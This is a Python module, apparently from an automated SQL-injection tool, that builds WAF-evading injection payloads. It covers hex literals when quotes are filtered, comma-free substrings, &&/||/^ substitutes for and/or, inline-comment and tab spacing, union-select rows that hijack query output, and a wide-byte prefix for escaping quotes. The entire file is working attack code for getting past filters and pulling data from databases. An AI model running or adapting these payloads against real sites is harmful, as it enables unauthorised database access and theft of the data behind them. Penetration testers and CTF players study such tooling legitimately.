"""WAF 感知 Payload 构造器。

职责：把"核心 SQL 表达式"组装成完整可发 payload，并按 WAF 报告与实测形态自动变换：
- 形态（injection.form，实测命中）：classic / paren（括号法）/ inline（/**/）/ tab（%09）
- 引号被过滤  → 字符串走十六进制字面量
- 逗号被过滤  → substr from/for、limit offset
- and 被过滤  → 逻辑连接使用 && / or / ^
"""
from __future__ import annotations

from .models import InjectionPoint, WafReport
from ..tampers import apply_form, comma_free, to_hex_literal


class PayloadBuilder:
    def __init__(self, injection: InjectionPoint, waf: WafReport):
        self.inj = injection
        self.waf = waf

    # ------------------------------------------------------------------ pieces
    def str_lit(self, s: str) -> str:
        """字符串字面量：引号被过滤时使用十六进制。"""
        if self.waf.is_filtered("'"):
            return to_hex_literal(s)
        return "'" + s.replace("'", "''") + "'"

    def logic_and(self, cond: str) -> str:
        """拼接布尔条件，and 被过滤时依次尝试 &&/or。"""
        cond = f"({cond})"
        if not self.waf.is_filtered("and"):
            return f" and {cond}"
        if not self.waf.is_filtered("&&"):
            return f"&&{cond}"
        if not self.waf.is_filtered("or"):
            return f" or {cond}"
        return f"^{cond}"

    def logic_or(self, cond: str) -> str:
        """or 连接（登录框恒真语义）；or 被过滤时降级 || / and。"""
        cond = f"({cond})"
        if not self.waf.is_filtered("or"):
            return f" or {cond}"
        if not self.waf.is_filtered("||"):
            return f"||{cond}"
        if not self.waf.is_filtered("and"):
            return f" and {cond}"
        return f"^{cond}"

    # ------------------------------------------------------------------ transform
    def transform(self, sql: str) -> str:
        """按实测形态变换核心 SQL（空格被滤时切换括号/tab/内联）。"""
        sql = apply_form(sql, getattr(self.inj, "form", "classic") or "classic")
        if self.waf.is_filtered(","):
            sql = comma_free(sql)
        return sql

    def wrap(self, core: str, base_value: str | None = None,
             neutralize: bool = True) -> str:
        """组装完整 payload：base + closure + core + comment。

        neutralize：仅对 union 前缀生效（置空原查询行，让 union 行占据回显位）。
        """
        b = base_value if base_value is not None else self.inj.base_value
        if neutralize and core.lstrip().lower().startswith("union"):
            b = "0"
        pre = b if self.inj.numeric else b + self.inj.closure
        tail = self.inj.comment if self.inj.comment != "quote-close" else ""
        return pre + self.transform(core) + tail

    def union_row(self, exprs: list) -> str:
        """构造 union select 一行（exprs 为各列表达式，null 占位）。"""
        select_kw = "union/**/select/**/" if self.waf.is_filtered("space") else "union select "
        return self.wrap(select_kw + ",".join(exprs), base_value="0")

    def widebyte_prefix(self) -> str:
        """宽字节 payload 的前缀（\xdf + 闭合）。"""
        if self.inj.numeric:
            return self.inj.base_value
        return self.inj.base_value + "\xdf" + self.inj.closure
